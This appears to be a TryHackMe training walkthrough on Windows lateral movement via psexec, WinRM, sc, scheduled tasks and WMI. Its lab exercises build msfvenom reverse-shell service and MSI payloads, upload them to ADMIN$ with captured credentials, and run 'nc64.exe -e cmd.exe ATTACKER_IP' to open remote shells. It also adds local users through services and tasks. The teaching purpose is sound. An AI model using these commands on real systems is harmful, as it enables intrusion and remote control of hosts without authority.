# Spwning Processes Remotely
This task will look at the available methods an attacker has to spawn a process remotely, allowing them to run commands on machines where they have valid credentials. Each of the techniques discussed uses slightly different ways to achieve the same purpose, and some of them might be a better fit for some specific scenarios.
## Psexec

- **Ports:** 445/TCP (SMB)
- **Required Group Memberships:** Administrators

Psexec has been the go-to method when needing to execute processes remotely for years. It allows an administrator user to run commands remotely on any PC where he has access. Psexec is one of many Sysinternals Tools and can be downloaded [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).

The way psexec works is as follows:

1. Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.
2. Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with `C:\Windows\psexesvc.exe`.
3. Create some named pipes to handle stdin/stdout/stderr.

![psexec explained](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a488102fe0da47a3667961400cf298d8.png)  

To run psexec, we only need to supply the required administrator credentials for the remote host and the command we want to run (`psexec64.exe` is available under `C:\tools` in THMJMP2 for your convenience):

```shell-session
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

  

## Remote Process Creation Using WinRM

- **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Remote Management Users

Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.

To connect to a remote Powershell session from the command line, we can use the following command:

```shell-session
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Once we have our PSCredential object, we can create an interactive session using the Enter-PSSession cmdlet:

```powershell
Enter-PSSession -Computername TARGET -Credential $credential
```

Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM. Credentials must be passed through a PSCredential object as well:

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

  

## Remotely Creating Services Using sc

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCE/RPC)
    - 445/TCP (RPC over SMB Named Pipes)
    - 139/TCP (RPC over SMB Named Pipes)
- **Required Group Memberships:** Administrators

Windows services can also be leveraged to run arbitrary commands since they execute a command when started. While a service executable is technically different from a regular application, if we configure a Windows service to run any application, it will still execute it and fail afterwards.

We can create a service on a remote host with sc.exe, a standard tool available in Windows. When using sc, it will try to connect to the Service Control Manager (SVCCTL) remote service program through RPC in several ways:

1. A connection attempt will be made using DCE/RPC. The client will first connect to the Endpoint Mapper (EPM) at port 135, which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program. The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of 49152-65535.

![svcctl via RPC](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c4f288e73da9c0f4d480ad817b365fe5.png)  

3. If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).

![svcctl via named pipe](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0c425c37d692c771c944e38dca8c5879.png)  

We can create and start a service named "THMservice" using the following commands:

```shell-session
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

The "net user" command will be executed when the service is started, creating a new local user on the system. Since the operating system is in charge of starting the service, you won't be able to look at the command output.

To stop and delete the service, we can then execute the following commands:

```shell-session
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

  

## Creating Scheduled Tasks Remotely

Another Windows feature we can use is Scheduled Tasks. You can create and run one remotely with schtasks, available in any Windows installation. To create a task named THMtask1, we can use the following commands:

```shell-session
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1" 
```

We set the schedule type (/sc) to ONCE, which means the task is intended to be run only once at the specified time and date. Since we will be running the task manually, the starting date (/sd) and starting time (/st) won't matter much anyway.

Since the system will run the scheduled task, the command's output won't be available to us, making this a blind attack.

Finally, to delete the scheduled task, we can use the following command and clean up after ourselves:

```shell-session
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

  

## Let's Get to Work!  

To complete this exercise, you will need to connect to THMJMP2 using the credentials assigned to you in Task 1 from [http://distributor.za.tryhackme.com/creds](http://distributor.za.tryhackme.com/creds). If you haven't done so yet, click on the link and get credentials now. Once you have your credentials, connect to THMJMP2 via SSH:

`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`

For this exercise, we will assume we have already captured some credentials with administrative access:

**User:** ZA.TRYHACKME.COM\t1_leonard.summers

**Password:** EZpass4ever

We'll show how to use those credentials to move laterally to THMIIS using `sc.exe`. Feel free to try the other methods, as they all should work against THMIIS.

While we have already shown how to use sc to create a user on a remote system (by using `net user`), we can also upload any binary we'd like to execute and associate it with the created service. However, if we try to run a reverse shell using this method, we will notice that the reverse shell disconnects immediately after execution. The reason for this is that service executables are different to standard .exe files, and therefore non-service executables will end up being killed by the service manager almost immediately. Luckily for us, msfvenom supports the `exe-service` format, which will encapsulate any payload we like inside a fully functional service executable, preventing it from getting killed.

To create a reverse shell, we can use the following command:

**Note:** Since you will be sharing the lab with others, you'll want to use a different filename for your payload instead of "myservice.exe" to avoid overwriting someone else's payload.

AttackBox

```shell-session
user@AttackBox$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```

We will then proceed to use t1_leonard.summers credentials to upload our payload to the ADMIN$ share of THMIIS using smbclient from our AttackBox:

AttackBox

```shell-session
user@AttackBox$ smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
 putting file myservice.exe as \myservice.exe (0.0 kb/s) (average 0.0 kb/s)
```

Once our executable is uploaded, we will set up a listener on the attacker's machine to receive the reverse shell from `msfconsole`:

AttackBox

```shell-session
user@AttackBox$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.10.10.16:4444
```

Alternatively, you can run the following one-liner on your Linux console to do the same:

AttackBox

```shell-session
user@AttackBox$ msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
```

Since `sc.exe` doesn't allow us to specify credentials as part of the command, we need to use `runas` to spawn a new shell with t1_leonard.summer's access token. Still, we only have SSH access to the machine, so if we tried something like `runas /netonly /user:ZA\t1_leonard.summers cmd.exe`, the new command prompt would spawn on the user's session, but we would have no access to it. To overcome this problem, we can use runas to spawn a second reverse shell with t1_leonard.summers access token:

THMJMP2: Command Prompt

```shell-session
C:\> runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```

**Note:** Remember that since you are using `runas` with the `/netonly` option, it will not bother to check if the provided credentials are valid (more info on this on the [Enumerating AD room](https://tryhackme.com/room/adenumeration)), so be sure to type the password correctly. If you don't, you will see some ACCESS DENIED errors later in the room.

We can receive the reverse shell connection using nc in our AttackBox as usual:

AttackBox

```shell-session
user@AttackBox$ nc -lvp 4443
```

  

And finally, proceed to create a new service remotely by using sc, associating it with our uploaded binary:

THMJMP2: Command Prompt (As t1_leonard.summers)

```shell-session
C:\> sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
C:\> sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
```

Be sure to change the name of your service to avoid clashing with other students.

Once you have started the service, you should receive a connection in your AttackBox from where you can access the first flag on t1_leonard.summers desktop.


# Moving Laterally Using WMI
We can also perform many techniques discussed in the previous task differently by using Windows Management Instrumentation (WMI). WMI is Windows implementation of Web-Based Enterprise Management (WBEM), an enterprise standard for accessing management information across devices. 

In simpler terms, WMI allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement in various ways, which we'll discuss.

  

## Connecting to WMI From Powershell

Before being able to connect to WMI using Powershell commands, we need to create a PSCredential object with our user and password. This object will be stored in the $credential variable and utilised throughout the techniques on this task:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

We then proceed to establish a WMI session using either of the following protocols:

- **DCOM:** RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
- **Wsman:** WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

To establish a WMI session from Powershell, we can use the following commands and store the session on the $Session variable, which we will use throughout the room on the different techniques:

```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

The `New-CimSessionOption` cmdlet is used to configure the connection options for the WMI session, including the connection protocol. The options and credentials are then passed to the `New-CimSession` cmdlet to establish a session against a remote host.

  

## Remote Process Creation Using WMI

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
        
- **Required Group Memberships:** Administrators

We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the session we created before:

```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

Notice that WMI won't allow you to see the output of any command but will indeed create the required process silently.

On legacy systems, the same can be done using wmic from the command prompt:

```shell-session
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
```

  

## Creating Services Remotely with WMI

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

We can create services with WMI through Powershell. To create a service called THMService2, we can use the following command:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

And then, we can get a handle on the service and start it with the following commands:

```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Finally, we can stop and delete the service with the following commands:

```powershell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

  

## Creating Scheduled Tasks Remotely with WMI

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

We can create and execute scheduled tasks by using some cmdlets available in Windows default installations:

```powershell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

To delete the scheduled task after it has been used, we can use the following command:

```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

  

## Installing MSI packages through WMI

- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCERPC)
    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Administrators

MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI:

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

We can achieve the same by us using wmic in legacy systems:

```shell-session
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

  

## Let's Get to Work!

To complete this exercise, you will need to connect to THMJMP2 using the credentials assigned to you on Task 1 from [http://distributor.za.tryhackme.com/creds](http://distributor.za.tryhackme.com/creds). If you haven't done so yet, click on the link and get credentials. Once you have your credentials, connect to THMJMP2 via SSH:

`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`

For this exercise, we will assume we have already captured some credentials with administrative access:

**User:** ZA.TRYHACKME.COM\t1_corine.waters

**Password:** Korine.1994

We'll show how to use those credentials to move laterally to THM-IIS using WMI and MSI packages. Feel free to try the other methods presented during this task.

We will start by creating our MSI payload with msfvenom from our attacker machine:

**Note:** Since you will be sharing the lab with others, you'll want to use a different filename for your payload instead of "myinstaller.msi" to avoid overwriting someone else's payload.  

AttackBox

```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
```

We then copy the payload using SMB or any other method available:

AttackBox

```shell-session
user@AttackBox$ smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
 putting file myinstaller.msi as \myinstaller.msi (0.0 kb/s) (average 0.0 kb/s)
```

Since we copied our payload to the ADMIN$ share, it will be available at C:\Windows\ on the server.

We start a handler to receive the reverse shell from Metasploit:

AttackBox

```shell-session
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4445
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.10.10.16:4445
```

Let's start a WMI session against THMIIS from a Powershell console:

THMJMP2: Powershell

```shell-session
PS C:\> $username = 't1_corine.waters';
PS C:\> $password = 'Korine.1994';
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

We then invoke the Install method from the Win32_Product class to trigger the payload:

THMJMP2:Powershell

```shell-session
PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

As a result, you should receive a connection in your AttackBox from where you can access a flag on t1_corine.waters desktop.
